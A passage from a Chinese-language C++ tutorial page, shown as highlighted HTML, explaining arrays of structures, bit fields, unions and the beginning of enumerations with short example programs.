返回一个 Student 结构</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">Student s3 = createStudent(<span class="string">&quot;David&quot;</span>, <span class="number">222</span>, <span class="number">3.7</span>); </span><br></pre></td></tr></table></figure></li></ol><p>这些特性使得结构成为组织和传递相关数据的强大工具。</p><h3 id="4-4-5-结构数组"><a href="#4-4-5-结构数组" class="headerlink" title="4.4.5 结构数组"></a>4.4.5 结构数组</h3><p>可以创建**结构数组 (Array of Structures)**，即数组的每个元素都是一个结构变量。这对于处理一组具有相同结构的数据非常有用，例如一个班级的学生信息、一个商店的库存列表等。</p><p><strong>声明和初始化:</strong></p><p>声明结构数组与声明普通数组类似，只是元素类型是结构类型。初始化可以使用嵌套的花括号。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">int</span> studentID;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> CLASS_SIZE = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 声明一个包含 CLASS_SIZE 个 Student 结构的数组</span></span><br><span class="line">    Student classRoster[CLASS_SIZE]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化结构数组 (使用嵌套花括号)</span></span><br><span class="line">    Student graduates[<span class="number">2</span>] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;Alice&quot;</span>, <span class="number">101</span>&#125;, <span class="comment">// 初始化 graduates[0]</span></span><br><span class="line">        &#123;<span class="string">&quot;Bob&quot;</span>, <span class="number">102</span>&#125;    <span class="comment">// 初始化 graduates[1]</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 列表初始化</span></span><br><span class="line">    Student freshmen[CLASS_SIZE] &#123;</span><br><span class="line">        &#123;<span class="string">&quot;Charlie&quot;</span>, <span class="number">201</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;David&quot;</span>, <span class="number">202</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;Eve&quot;</span>, <span class="number">203</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问结构数组中的元素及其成员</span></span><br><span class="line">    classRoster[<span class="number">0</span>].name = <span class="string">&quot;Frank&quot;</span>;</span><br><span class="line">    classRoster[<span class="number">0</span>].studentID = <span class="number">301</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Graduate 1: &quot;</span> &lt;&lt; graduates[<span class="number">0</span>].name &lt;&lt; <span class="string">&quot; (ID: &quot;</span> &lt;&lt; graduates[<span class="number">0</span>].studentID &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Freshman 3 ID: &quot;</span> &lt;&lt; freshmen[<span class="number">2</span>].studentID &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Roster 1 Name: &quot;</span> &lt;&lt; classRoster[<span class="number">0</span>].name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历结构数组</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nFreshmen List:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CLASS_SIZE; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; freshmen[i].name &lt;&lt; <span class="string">&quot; (ID: &quot;</span> &lt;&lt; freshmen[i].studentID &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>Student classRoster[CLASS_SIZE];</code>: 声明了一个数组，每个元素都是 <code>Student</code> 结构。</li><li>  <code>graduates[0] = &#123;&quot;Alice&quot;, 101&#125;;</code>: 初始化数组的第一个元素（一个 <code>Student</code> 结构）。</li><li>  <code>freshmen[i].name</code>: 访问数组 <code>freshmen</code> 中索引为 <code>i</code> 的元素的 <code>name</code> 成员。</li></ul><h3 id="4-4-6-结构中的位字段"><a href="#4-4-6-结构中的位字段" class="headerlink" title="4.4.6 结构中的位字段"></a>4.4.6 结构中的位字段</h3><p><strong>位字段 (Bit Field)</strong> 是一种特殊的结构成员，它允许你指定成员变量占用的**位数 (bits)**。这主要用于需要精确控制内存布局或与硬件寄存器交互的场景。</p><p><strong>语法:</strong></p><p>在结构定义中，成员名后面跟一个冒号 <code>:</code> 和一个整数常量，表示该成员占用的位数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RegisterFlags</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> readEnable : <span class="number">1</span>; <span class="comment">// 占用 1 位</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> writeEnable : <span class="number">1</span>; <span class="comment">// 占用 1 位</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> mode : <span class="number">2</span>;       <span class="comment">// 占用 2 位</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> reserved : <span class="number">4</span>;   <span class="comment">// 占用 4 位 (通常用于填充或对齐)</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>特点和注意事项:</strong></p><ul><li>  <strong>类型:</strong> 位字段的类型通常是 <code>unsigned int</code> 或 <code>signed int</code>（或 <code>int</code>，其符号性取决于实现），也可以是 <code>bool</code> (C++11，等效于 <code>: 1</code>)。</li><li>  <strong>内存节省:</strong> 当多个标志或小范围数值需要存储时，位字段可以显著节省内存，将它们打包到单个整数或几个字节中。</li><li>  <strong>硬件接口:</strong> 常用于映射硬件设备寄存器的特定位。</li><li>  <strong>访问:</strong> 像普通结构成员一样使用点运算符访问，但不能获取位字段的地址（<code>&amp;</code> 运算符不能用于位字段）。</li><li>  <strong>可移植性:</strong> 位字段的内存布局（位的排列顺序、跨字节边界的处理）可能因编译器和平台而异，因此在需要跨平台兼容性的代码中应谨慎使用。</li><li>  <strong>大小限制:</strong> 位数不能超过其基础类型的位数（例如，<code>unsigned int</code> 的位字段不能超过 <code>int</code> 的位数）。</li><li>  <strong>匿名位字段:</strong> 可以使用未命名的位字段来填充或对齐，例如 <code>unsigned int : 2;</code>。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设用于控制某个设备的状态</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceStatus</span> &#123;</span></span><br><span class="line">    <span class="comment">// 打包到单个字节 (假设 unsigned int 至少 8 位)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> powerOn : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> errorFlag : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> channel : <span class="number">3</span>; <span class="comment">// 可以表示 0-7</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> : <span class="number">3</span>;       <span class="comment">// 填充未使用的 3 位，使总共 8 位</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DeviceStatus status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置位字段的值</span></span><br><span class="line">    status.powerOn = <span class="number">1</span>;    <span class="comment">// 设备开机</span></span><br><span class="line">    status.errorFlag = <span class="number">0</span>; <span class="comment">// 无错误</span></span><br><span class="line">    status.channel = <span class="number">5</span>;   <span class="comment">// 设置通道为 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取位字段的值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Device Status:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Power On: &quot;</span> &lt;&lt; status.powerOn &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Error Flag: &quot;</span> &lt;&lt; status.errorFlag &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Channel: &quot;</span> &lt;&lt; status.channel &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 位字段通常打包存储</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of DeviceStatus struct: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(DeviceStatus) &lt;&lt; <span class="string">&quot; byte(s)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// 输出通常是 1 或 4 (取决于编译器如何对齐和打包，以及 int 的大小)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查特定标志</span></span><br><span class="line">    <span class="keyword">if</span> (status.powerOn) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Device is powered on.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能获取位字段地址</span></span><br><span class="line">    <span class="comment">// unsigned int* pPower = &amp;status.powerOn; // 错误!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>位字段是一种底层工具，适用于特定场景，但在常规应用程序开发中不常用。</p><h2 id="4-5-共用体"><a href="#4-5-共用体" class="headerlink" title="4.5 共用体"></a>4.5 共用体</h2><p><strong>共用体 (Union)</strong> 是一种特殊的数据结构，它也允许在一个结构中存储不同的数据类型，但与结构体 (struct) 不同的是，共用体的<strong>所有成员共享同一块内存空间</strong>。</p><p><strong>核心特点:</strong></p><ul><li>  <strong>内存共享:</strong> 共用体的大小由其<strong>最大</strong>的成员的大小决定。所有成员都从相同的内存地址开始存储。</li><li>  <strong>同一时间只有一个成员有效:</strong> 在任何时刻，你只能有效地存储和使用共用体中的<strong>一个</strong>成员的值。当你给一个成员赋值时，可能会覆盖掉其他成员的数据。</li><li>  <strong>节省内存:</strong> 当你需要存储多种类型的数据，但知道在任何时候只需要用到其中一种时，共用体可以节省内存，因为它只需要分配足够容纳最大成员的空间。</li></ul><p><strong>定义共用体:</strong></p><p>使用 <code>union</code> 关键字定义，语法与 <code>struct</code> 类似。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">UnionName</span> &#123;</span></span><br><span class="line">    memberType1 memberName1;</span><br><span class="line">    memberType2 memberName2;</span><br><span class="line">    <span class="comment">// ... more members</span></span><br><span class="line">&#125;; <span class="comment">// 注意定义末尾的分号</span></span><br></pre></td></tr></table></figure><p><strong>访问成员:</strong></p><p>与结构体一样，使用<strong>成员运算符</strong>（点运算符 <code>.</code>) 来访问共用体变量的成员。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个共用体，可以存储 int, long 或 double</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">DataValue</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> i_val;</span><br><span class="line">    <span class="keyword">long</span> l_val;</span><br><span class="line">    <span class="keyword">double</span> d_val;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DataValue data; <span class="comment">// 声明一个 DataValue 共用体变量</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of DataValue union: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(DataValue) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// 输出的大小通常等于 sizeof(double)，因为它是最大的成员</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储并使用 int 成员</span></span><br><span class="line">    data.i_val = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stored as int: &quot;</span> &lt;&lt; data.i_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// 此时访问 l_val 或 d_val 的结果是未定义的/无意义的</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储并使用 double 成员 (会覆盖之前的 int 值)</span></span><br><span class="line">    data.d_val = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stored as double: &quot;</span> &lt;&lt; data.d_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// 此时访问 i_val 或 l_val 的结果是未定义的/无意义的</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Reading i_val after storing double: &quot; &lt;&lt; data.i_val &lt;&lt; std::endl; // 结果不可靠</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储并使用 long 成员 (会覆盖之前的 double 值)</span></span><br><span class="line">    data.l_val = <span class="number">1234567890L</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stored as long: &quot;</span> &lt;&lt; data.l_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 追踪当前有效成员 ---</span></span><br><span class="line">    <span class="comment">// 通常需要一个额外的变量来记录当前哪个成员是有效的</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">DataType</span> &#123;</span> INT, LONG, DOUBLE &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DataPacket</span> &#123;</span></span><br><span class="line">        DataType type; <span class="comment">// 记录当前存储的数据类型</span></span><br><span class="line">        DataValue value; <span class="comment">// 共用体存储实际值</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    DataPacket packet;</span><br><span class="line">    packet.type = INT;</span><br><span class="line">    packet.value.i_val = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据类型访问</span></span><br><span class="line">    <span class="keyword">if</span> (packet.type == INT) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Packet contains int: &quot;</span> &lt;&lt; packet.value.i_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// ... 其他类型的检查</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>重要:</strong> 程序员有责任跟踪共用体中当前哪个成员是活动的（有效的）。读取非活动成员的值会导致未定义行为或得到无意义的数据。通常会结合一个枚举类型或整数标志来指示当前存储的数据类型，如 <code>DataPacket</code> 示例所示。</p><p><strong>匿名共用体 (Anonymous Union):</strong></p><p>共用体可以不带名称直接定义在结构体或类内部（或函数局部作用域）。匿名共用体的成员可以直接通过结构/类变量访问，就像它们是结构/类的直接成员一样。匿名共用体的所有成员仍然共享相同的内存。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> type; <span class="comment">// &#x27;I&#x27; for integer, &#x27;F&#x27; for float</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span> <span class="comment">// 匿名共用体</span></span><br><span class="line">        <span class="keyword">int</span> intVal;</span><br><span class="line">        <span class="keyword">float</span> floatVal;</span><br><span class="line">    &#125;; <span class="comment">// 注意这里没有变量名</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Widget w;</span><br><span class="line">    w.type = <span class="string">&#x27;I&#x27;</span>;</span><br><span class="line">    w.intVal = <span class="number">123</span>; <span class="comment">// 直接访问匿名共用体的成员</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (w.type == <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Widget value (int): &quot;</span> &lt;&lt; w.intVal &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (w.type == <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// w.floatVal = 3.14f; // 如果要存 float</span></span><br><span class="line">        <span class="comment">// std::cout &lt;&lt; &quot;Widget value (float): &quot; &lt;&lt; w.floatVal &lt;&lt; std::endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of Widget: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(Widget) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// 大小通常是 char 的大小 + 最大成员(int 或 float)的大小 + 可能的对齐填充</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用场景:</strong></p><ul><li>  <strong>节省内存:</strong> 当数据项有多种可能类型，但一次只使用一种时。</li><li>  <strong>类型双关 (Type Punning):</strong> 以不同的类型解释同一块内存区域（例如，将一个 <code>float</code> 的位模式解释为一个 <code>int</code>）。这是一种低级技巧，通常不可移植且可能违反 C++ 的严格别名规则 (strict aliasing rules)，应谨慎使用或避免。</li></ul><p><strong>与结构的比较:</strong></p><ul><li>  <strong>内存:</strong> 结构的所有成员都有自己独立的内存地址；共用体的所有成员共享起始地址。</li><li>  <strong>大小:</strong> 结构的大小约等于其所有成员大小之和（加上可能的对齐填充）；共用体的大小等于其最大成员的大小。</li><li>  <strong>有效性:</strong> 结构的所有成员可以同时有效；共用体只有一个成员能同时有效。</li></ul><p><strong>C++11 及以后的共用体:</strong></p><p>C++11 放宽了对共用体成员类型的限制，允许包含具有非平凡构造函数、析构函数或赋值运算符的类类型成员（如 <code>std::string</code>）。但是，如果共用体包含这样的成员，编译器<strong>不会</strong>自动生成默认的构造函数、析构函数或复制/移动操作。程序员必须<strong>手动管理</strong>这些成员的生命周期（例如，使用 placement new 在共用体内存上构造对象，并在不再需要时显式调用析构函数）。这使得包含复杂类型的共用体使用起来更加复杂和易错。对于只包含 POD (Plain Old Data) 类型（如 <code>int</code>, <code>float</code>, 指针, C 风格数组/结构）的共用体，其行为与 C 语言中类似。</p><h2 id="4-6-枚举"><a href="#4-6-枚举" class="headerlink" title="4.6 枚举"></a>4.6 枚举</h2><p>C++ 的 <code>enum</code> 工具提供了一种创建<strong>符号常量 (Symbolic Constant)</strong> 的方式，常用于定义一组相关的、具有名称的整数常量。这比使用 <code>const int</code> 或 <code>#define</code> 来定义一组相关常量更方便、更具可读性。</p><p><strong>基本概念:</strong></p><ul><li>  <strong>枚举类型 (Enumeration Type):</strong> <code>enum</code> 关键字用于创建一个新的用户定义的整数类型。</li><li>  <strong>枚举量 (Enumerator):</strong> 在枚举类型定义中列出的标识符。它们是具名的常量，代表整数值。</li></ul><p><strong>定义枚举:</strong></p><p>使用 <code>enum</code> 关键字，后跟枚举类型的名称，然后在花括号 <code>&#123;&#125;</code> 内列出枚举量，用逗号分隔。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">spectrum</span> &#123;</span>red, orange, yellow, green, blue, violet, indigo, ultraviolet&#125;;</span><br></pre></td></tr></table></figure><p><strong>工作原理:</strong></p><ol><li> <strong>创建新类型:</strong> 上述语句创建了一个名为 <code>spectrum</code> 的新类型。</li><li> <strong>定义枚举量:</strong> <code>red</code>, <code>orange</code>, <code>yellow</code> 等成为 <code>spectrum</code> 类型的符号常量。</li><li><strong>自动赋值:</strong> 默认情况下，编译器将整数值赋给枚举量，从 0 开始，依次递增 1。<ul><li>  <code>red</code> 值为 0</li><li>  <code>orange</code> 值为 1</li><li>  <code>yellow</code> 值为 2</li><li>  …</li><li>  <code>ultraviolet</code> 值为 7</li></ul></li></ol><p><strong>声明和使用枚举变量:</strong></p><p>可以像使用其他类型一样声明枚举类型的变量。枚举变量通常只能被赋予该枚举类型中定义的枚举量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">spectrum</span> &#123;</span>red, orange, yellow, green, blue, violet, indigo, ultraviolet&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    spectrum band; <span class="comment">// 声明一个 spectrum 类型的变量 band</span></span><br><span class="line"></span><br><span class="line">    band = blue; <span class="comment">// 将枚举量 blue 赋给 band (合法)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Current band (enum value): &quot;</span> &lt;&lt; band &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 blue 对应的整数值 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// band = 2000; // 错误! 不能直接将整数赋给枚举变量 (类型不匹配)</span></span><br><span class="line">    <span class="comment">// band = red + orange; // 错误! + 运算符未对枚举类型定义 (虽然 red 和 orange 有整数值)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以将枚举量赋给 int 变量 (枚举量会自动提升为 int)</span></span><br><span class="line">    <span class="keyword">int</span> colorCode = green; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Color code for green: &quot;</span> &lt;&lt; colorCode &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以强制将 int 转换为枚举类型 (需要显式转换，且需谨慎)</span></span><br><span class="line">    band = <span class="keyword">static_cast</span>&lt;spectrum&gt;(<span class="number">3</span>); <span 